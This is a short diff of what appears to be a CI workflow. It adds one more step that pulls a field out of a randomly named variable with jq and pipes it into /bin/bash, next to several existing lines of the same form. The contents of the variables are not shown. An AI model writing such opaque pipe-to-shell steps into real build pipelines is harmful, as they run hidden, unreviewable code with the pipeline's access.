@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$c8798" | jq -r .w15 | /bin/bash
           printf '%s' "$gefi3098" | jq -r .f05094 | /bin/bash
           echo $fod0721 | jq -r .qju54193 | /bin/bash
+          echo $wzpu217 | jq -r .benco6986 | /bin/bash
 
       - name: Archive results
         if: always()
